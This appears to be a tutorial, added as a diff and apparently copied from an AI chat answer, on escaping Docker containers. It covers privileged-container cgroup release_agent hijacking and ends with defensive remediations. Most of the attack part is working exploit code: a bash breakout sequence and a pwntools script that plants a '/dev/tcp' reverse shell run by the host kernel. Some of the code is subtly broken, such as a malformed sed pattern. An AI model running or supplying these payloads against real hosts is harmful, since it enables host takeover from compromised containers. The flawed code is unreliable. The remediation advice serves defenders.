@@ -1,1 +1,114 @@
+Docker Escape and Container Breakout vulnerabilities occur when an attacker gains code execution inside a containerized application and leverages misconfigurations, missing isolation boundaries, or kernel vulnerabilities to escape the container's namespace and achieve code execution directly on the underlying host operating system.
+Containerization relies entirely on Linux kernel mechanisms—mainly Namespaces (for visibility isolation) and Cgroups (for resource tracking)—rather than true hardware virtualization. If a container is granted excessive privileges or has access to dangerous host resources, the logical boundary collapses.
+Here is a step-by-step example of a classic container escape utilizing a Privileged Container Misconfiguration to hijack the host's kernel helper pathways.
 
+1. The Vulnerable Environment: The "Privileged" Container
+
+When a container is started with the dangerous --privileged flag, Docker drops almost all security profiles (including AppArmor, Seccomp, and Capabilities restrictions). This means the root user inside the container has almost the same privileges as the root user on the host, including direct access to physical devices via the /dev filesystem.
+bash
+# How the vulnerable container is deployed by an administrator
+docker run --privileged -it ubuntu /bin/bash
+Use code with caution.
+
+2. The Exploit Mechanic: release_agent Hijacking
+
+Inside a privileged container, the root user has the ability to mount the host's Cgroups (Control Groups) filesystem.
+Cgroups feature a notification mechanism called a release_agent. When a cgroup becomes empty (meaning all processes inside that specific resource tracking group stop running), the Linux kernel automatically executes a binary specified in the cgroup's release_agent file on the host system with full root privileges.
+By mounting the cgroup directory, writing a malicious script into the container, and pointing the host's cgroup release_agent directly to our script's path on the disk, we force the host kernel to execute our payload outside the container.
+
+3. Step-by-Step Breakout Payload (Bash Script)
+
+If an attacker has a raw shell inside the privileged container, they can execute this sequence of commands to break out:
+bash
+# 1. Create a temporary directory and mount the host cgroup controller
+mkdir -p /tmp/cgroup
+mount -t cgroup -o rdma cgroup /tmp/cgroup
+mkdir -p /tmp/cgroup/escape
+
+# 2. Enable the release_agent notification trigger inside our subgroup
+echo 1 > /tmp/cgroup/escape/notify_on_release
+
+# 3. Find the container's absolute path on the host filesystem 
+# Docker exposes the internal mount coordinates inside /etc/mtab
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+
+# 4. Write our malicious payload script that we want the host to execute
+# This script will write the host's process tree output directly back into the container
+echo '#!/bin/sh' > /cmd.sh
+echo "ps aux > ${host_path}/host_processes.txt" >> /cmd.sh
+chmod +x /cmd.sh
+
+# 5. Set the host's cgroup release_agent to point to our script
+# We must use the 'host_path' variable because the host kernel evaluates this path!
+echo "${host_path}/cmd.sh" > /tmp/cgroup/release_agent
+
+# 6. Trigger the exploit loop by spinning up and killing a dummy process in our cgroup
+sh -c "echo \$\$ > /tmp/cgroup/escape/cgroup.procs"
+
+# 7. View the output leaked from the host system back inside the container
+sleep 1
+cat /host_processes.txt
+Use code with caution.
+
+4. Automated Python Breakout Script (docker_escape.py)
+
+This pwntools script automates the containment breach against a remote or local terminal container service, establishing the reverse-shell pipe out to the host.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Initialize interaction context with the container shell prompt
+# (Can be a local process or remote network endpoint like SSH/Netcat)
+io = process('/bin/bash') 
+
+log.info("Verifying container privilege status...")
+io.sendline(b"capsh --print | grep -q cap_sys_admin && echo '[+] Privileged Context Verified' || echo '[-] Low Privilege'")
+
+response = io.recvuntil(b"Context Verified", timeout=2)
+if b"[+]" not in response:
+    log.error("Container lacks CAP_SYS_ADMIN privileges. Release agent vector unavailable.")
+    exit(1)
+
+log.success("CAP_SYS_ADMIN confirmed. Initializing host breakout payload...")
+
+# Commands sequence structured into a compact execution string
+exploit_commands = [
+    b"mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp",
+    b"mkdir -p /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release",
+    b"host_dir=$(sed -n 's/.*perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)",
+    # Craft a payload that initiates a reverse shell straight back to an attacker's listener on the host network
+    b"echo '#!/bin/sh' > /breakout.sh",
+    b"echo 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1' >> /breakout.sh",
+    b"chmod +x /breakout.sh",
+    b"echo \"$host_dir/breakout.sh\" > /tmp/cgrp/release_agent",
+    # Trigger the empty cgroup callback event mechanism
+    b"sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\""
+]
+
+for cmd in exploit_commands:
+    io.sendline(cmd)
+    
+log.success("Exploit sequence transmitted! Check your local listener on port 4444.")
+io.interactive()
+Use code with caution.
+
+5. Categorizing Container Escape Attack Vectors
+
+When targeting or auditing a container infrastructure environment, breakout vectors generally fit into three strategic buckets:
+• Kernel Exploitation (DirtyCOW, CoreSight, etc.): If the host's Linux Kernel is vulnerable to a local privilege escalation bug, a root user inside any container can exploit it to seize control of the shared host kernel space directly.
+• Dangerous Socket Mounts (docker.sock): If a container mapping includes mounting the Unix socket /var/run/docker.sock, the container can issue direct structural commands to the host's Docker daemon. You can escape instantly by instructing the host daemon to spawn a new container that mounts the host’s root directory (/) straight into /mnt.
+• Capabilities Misconfigurations: Granting excessive individual Linux capabilities (like CAP_SYS_ADMIN, CAP_SYS_RAWIO, or CAP_SYS_MODULE) strips away the isolation properties of namespaces, providing direct pathways to control host resources or inject kernel modules.
+
+6. Architectural Defensive Remediations
+
+To permanently eliminate container breakout avenues:
+• Enforce Rootless Containers: Configure container runtimes to execute using user namespaces (userns-remap). This map structures the container's internal uid=0 (root) to an unprivileged high-number UID (e.g., uid=100000) on the host system, ensuring that if a breakout occurs, the attacker lands with zero privileges.
+• Never Use --privileged: Restrict structural system capabilities tightly. Utilize granular capability drop configurations in your production setup:yaml
+# Secure Kubernetes/Docker Deployment Profile Example
+securityContext:
+  allowPrivilegeEscalation: false
+  capabilities:
+    drop:
+      - ALL
+Use code with caution.
+• Implement Strict Read-Only Filesystems: Mount container root filesystems as read-only (--read-only). This blocks attackers from writing temporary exploit code or scripts like breakout.sh to the disk, neutralizing multi-stage execution pipelines.
